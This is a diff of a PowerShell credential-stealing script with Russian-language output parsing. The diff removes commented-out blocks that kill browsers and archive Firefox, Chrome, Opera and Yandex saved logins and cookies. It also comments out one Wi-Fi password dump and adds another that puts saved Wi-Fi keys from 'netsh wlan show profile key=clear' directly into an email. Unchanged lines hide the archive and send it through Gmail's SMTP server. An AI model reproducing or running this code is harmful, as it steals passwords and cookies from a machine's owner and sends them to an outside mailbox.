@@ -34,82 +34,15 @@ for ($i=0; $i -lt 5; $i++){
   }
 }
 
-echo "56565656565656565656565656"
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize > $env:TEMP\w.txt
-$w=$env:TEMP+'\w.txt'
-if("7"-in $arh)
-  {.\7z.exe a $p $w -spf -tzip;echo " wqwe221ewwe"}
-else
-  {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
-echo "dadasdasdasdasasd"
+# echo "56565656565656565656565656"
+# (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize > $env:TEMP\w.txt
+# $w=$env:TEMP+'\w.txt'
+# if("7"-in $arh)
+#   {.\7z.exe a $p $w -spf -tzip;echo " wqwe221ewwe"}
+# else
+#   {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
+# echo "dadasdasdasdasasd"
 #######################
-# for ($i=0; $i -lt 5; $i++) {
-#   if(Test-Path -Path $lst[$i][0]){
-#     echo ('______{0}' -f $lst[$i][0])
-#     try{
-#       Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
-#     }catch{
-#       echo 'asd'
-#     }
-#   }
-# }
-
-
-# $f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");
-# if(Test-Path -Path $f)
-#   {Stop-Process -Name firefox -ErrorAction SilentlyContinue;
-#   if("WinRAR"-in $arh)
-#     {Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-#   elseif("7-Zip" -in $arh)
-#     {.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}
-#   echo "Mqwe"
-# }
-# else{echo "Masd";$e=$e+'Masd'}
-
-# $g=($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\");
-# if(Test-Path -Path $g){
-#   Stop-Process -Name chrome -ErrorAction SilentlyContinue;
-#   if("WinRAR"-in $arh)
-#     {Get-ChildItem -Path $g -Include "Login Data", "Cookies" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-#   elseif("7-Zip" -in $arh)
-#     {.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}
-#   echo "Gqwe"
-# }
-# else{echo "Gasd";$e=$e+'Gasd'}
- 
-# $y=($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\");
-# if(Test-Path -Path $y){
-#   Stop-Process -Name browser -ErrorAction SilentlyContinue;
-#   if("WinRAR" -in $arh)
-#     {Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-#   elseif("7-Zip"-in $arh)
-#     {.\7z.exe a $p ($y+"Ya Passman Data") -spf -tzip | .\7z.exe a $p ($y+"Cookies") -spf -tzip}
-#   echo "Yqwe"
-# }
-# else{echo "Yasd";$e=$e+'Yasd'}
-
-# $o=($env:APPDATA+"\Opera Software\Opera Stable\");
-# if(Test-Path -Path $o){
-#   Stop-Process -Name browser -ErrorAction SilentlyContinue;
-#   if("WinRAR" -in $arh)
-#     {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -CompressionLevel Fastest -DestinationPath $p}
-#   elseif("7-Zip"-in $arh)
-#     {.\7z.exe a $p ($o+"Login Data") -spf -tzip | .\7z.exe a $p ($o+"Cookies") -spf -tzip}
-#   echo "Oqwe"
-# }
-# else{echo "Oasd";$e=$e+'Oasd'}
-
-# $og=($env:APPDATA+"\Opera Software\Opera GX Stable\");
-# if(Test-Path -Path $og){
-#   Stop-Process -Name opera111111111111 -ErrorAction SilentlyContinue;
-#   if("WinRAR" -in $arh)
-#     {Get-ChildItem -Path $og -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -CompressionLevel Fastest -DestinationPath $p}
-#   elseif("7-Zip"-in $arh)
-#     {.\7z.exe a $p ($og+"Login Data") -spf -tzip | .\7z.exe a $p ($og+"Cookies") -spf -tzip}
-#   echo "OGqwe"
-# }
-# else{echo "OGasd";$e=$e+'OGasd'}
-
 attrib +H $p
 
 $SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
@@ -122,7 +55,6 @@ if("WinRAR"-in $arh)
 else
   {$ReportEmail.Attachments.Add($s)};
 
-$mes = New-Object System.Net.Mail.MailMessage
-$mes.Body = "<h1>Тестовое письмо</h1>"
+$ReportEmail.Body = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize)
 $SMTPInfo.Send($ReportEmail)
 
